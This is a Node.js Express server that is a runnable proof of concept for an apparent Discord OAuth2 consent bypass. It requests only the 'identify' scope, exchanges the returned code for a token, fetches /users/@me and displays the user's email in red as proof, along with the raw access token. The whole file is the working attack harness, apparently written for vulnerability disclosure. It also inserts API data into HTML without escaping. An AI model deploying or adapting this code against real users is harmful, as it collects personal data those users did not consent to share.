require('dotenv').config();
const express = require('express');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI || `http://localhost:${port}/callback`;

function getAuthUrl(scope = 'identify') {
    return `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${encodeURIComponent(scope.trim())}`;
}

// Main route: Choose scopes and generate authorization link
app.get('/', (req, res) => {
    const initialScope = 'identify';
    const initialAuthUrl = getAuthUrl(initialScope);

    res.send(`<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC: Discord OAuth2 Consent Bypass</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 40px auto;
            padding: 0 20px;
            line-height: 1.6;
            color: #222;
        }
        h1 { margin-bottom: 5px; }
        .subtitle { color: #555; margin-bottom: 25px; }
        .box {
            background: #f8f9fa;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .presets {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }
        .preset-btn {
            background: #fff;
            border: 1px solid #bbb;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .preset-btn:hover { background: #eee; }
        .preset-btn.highlight {
            border-color: #d9534f;
            color: #d9534f;
            font-weight: bold;
        }
        .checkbox-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }
        .checkbox-group label {
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        input[type="text"] {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
            margin-top: 5px;
        }
        .url-box {
            background: #eef;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 13px;
            word-break: break-all;
            margin-top: 10px;
        }
        .btn-discord {
            display: inline-block;
            background: #5865F2;
            color: #fff;
            padding: 12px 24px;
            border-radius: 6px;
            text-decoration: none;
            font-weight: bold;
            font-size: 16px;
            margin-top: 15px;
            transition: background 0.2s;
        }
        .btn-discord:hover { background: #4752c4; }
    </style>
</head>
<body>
    <h1>PoC: Discord OAuth2 Consent Bypass</h1>
    <p class="subtitle">Sélectionnez le(s) scope(s) souhaité(s) pour tester l'autorisation Discord.</p>

    <div class="box">
        <h3>1. Préréglages rapides</h3>
        <div class="presets">
            <button type="button" class="preset-btn highlight" onclick="setPreset('identify')">🎯 PoC Exploit (identify)</button>
            <button type="button" class="preset-btn" onclick="setPreset('identify email')">🛡️ Normal (identify email)</button>
            <button type="button" class="preset-btn" onclick="setPreset('identify guilds')">🌐 Profil + Guilds (identify guilds)</button>
            <button type="button" class="preset-btn" onclick="setPreset('identify connections')">🔗 Profil + Connections</button>
        </div>

        <h3>2. Choix des scopes</h3>
        <div class="checkbox-group">
            <label><input type="checkbox" id="cb_identify" value="identify" checked onchange="onCheckboxChange()"> identify</label>
            <label><input type="checkbox" id="cb_email" value="email" onchange="onCheckboxChange()"> email</label>
            <label><input type="checkbox" id="cb_guilds" value="guilds" onchange="onCheckboxChange()"> guilds</label>
            <label><input type="checkbox" id="cb_connections" value="connections" onchange="onCheckboxChange()"> connections</label>
        </div>

        <div>
            <label for="scopeInput"><strong>Scope final envoyé (modifiable manuellement) :</strong></label>
            <input type="text" id="scopeInput" value="${initialScope}" oninput="onInputChange()">
        </div>

        <div style="margin-top: 15px;">
            <strong>URL d'autorisation générée :</strong>
            <div class="url-box" id="urlPreview">${initialAuthUrl}</div>
        </div>

        <a id="authLink" class="btn-discord" href="${initialAuthUrl}">Login with Discord (Test)</a>
    </div>

    <script>
        const clientId = "${CLIENT_ID || ''}";
        const redirectUri = "${REDIRECT_URI || ''}";

        function updateUrl(scopeStr) {
            scopeStr = scopeStr.trim() || 'identify';
            const authUrl = "https://discord.com/api/oauth2/authorize?client_id=" + encodeURIComponent(clientId)
                + "&redirect_uri=" + encodeURIComponent(redirectUri)
                + "&response_type=code&scope=" + encodeURIComponent(scopeStr);

            document.getElementById('urlPreview').textContent = authUrl;
            document.getElementById('authLink').href = authUrl;
        }

        function onCheckboxChange() {
            const selected = [];
            ['identify', 'email', 'guilds', 'connections'].forEach(s => {
                const cb = document.getElementById('cb_' + s);
                if (cb && cb.checked) selected.push(s);
            });
            const scopeStr = selected.join(' ');
            document.getElementById('scopeInput').value = scopeStr;
            updateUrl(scopeStr);
        }

        function onInputChange() {
            const val = document.getElementById('scopeInput').value;
            const parts = val.trim().split(/\\s+/);
            ['identify', 'email', 'guilds', 'connections'].forEach(s => {
                const cb = document.getElementById('cb_' + s);
                if (cb) cb.checked = parts.includes(s);
            });
            updateUrl(val);
        }

        function setPreset(scopeStr) {
            document.getElementById('scopeInput').value = scopeStr;
            onInputChange();
        }
    </script>
</body>
</html>`);
});

// Callback route: Gets the code, exchanges token, and displays all returned info
app.get('/callback', async (req, res) => {
    const code = req.query.code;

    if (!code) {
        return res.send(`
            <h1>Error: No code received from Discord.</h1>
            <p><a href="/">← Return to demo</a></p>
        `);
    }

    try {
        // 1. Exchange the code for an Access Token
        const params = new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI
        });

        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', params.toString(), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const tokenData = tokenResponse.data;
        const accessToken = tokenData.access_token;
        const grantedScope = tokenData.scope || 'N/A';

        // 2. Use the Token to get user info (/users/@me)
        let userData = null;
        let userError = null;

        try {
            const userResponse = await axios.get('https://discord.com/api/users/@me', {
                headers: { Authorization: `Bearer ${accessToken}` }
            });
            userData = userResponse.data;
        } catch (err) {
            userError = err.response ? err.response.data : err.message;
        }

        // 3. Show the proof and all returned Discord data
        const email = userData && userData.email ? userData.email : 'NOT RETRIEVED';

        res.send(`<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Proof of Concept (Result)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 900px;
            margin: 40px auto;
            padding: 0 20px;
            line-height: 1.6;
        }
        pre {
            background: #eee;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-size: 14px;
        }
        .btn {
            display: inline-block;
            background: #5865F2;
            color: #fff;
            padding: 10px 18px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <h1>Proof of Concept (Result)</h1>
    <p style="color: red; font-size: 22px;"><strong>Email retrieved: ${email}</strong></p>
    <p><strong>Scopes granted by Discord Token endpoint:</strong> <code>${grantedScope}</code></p>

    <h3>Here is all the data returned by the API (/users/@me):</h3>
    ${userData ? `<pre>${JSON.stringify(userData, null, 2)}</pre>` : `<p style="color: red;">Failed to query /users/@me (requires 'identify' or 'email' scope): <br><pre>${JSON.stringify(userError, null, 2)}</pre></p>`}

    <h3>OAuth2 Token response data (/oauth2/token):</h3>
    <pre>${JSON.stringify(tokenData, null, 2)}</pre>

    <p><a href="/" class="btn">← Tester un autre scope</a></p>
</body>
</html>`);

    } catch (error) {
        console.error(error.response ? error.response.data : error.message);
        const errorData = error.response ? error.response.data : error.message;
        res.status(500).send(`<!DOCTYPE html>
<html>
<head><title>OAuth2 Error</title></head>
<body style="font-family: Arial, sans-serif; max-width: 800px; margin: 40px auto; padding: 0 20px;">
    <h1 style="color: red;">An error occurred during OAuth2 token exchange</h1>
    <pre style="background: #fee; padding: 15px; border: 1px solid #fcc; border-radius: 5px;">${JSON.stringify(errorData, null, 2)}</pre>
    <p><a href="/">← Return to demo</a></p>
</body>
</html>`);
    }
});

app.listen(port, () => {
    console.log(`PoC Server started on http://localhost:${port}`);
});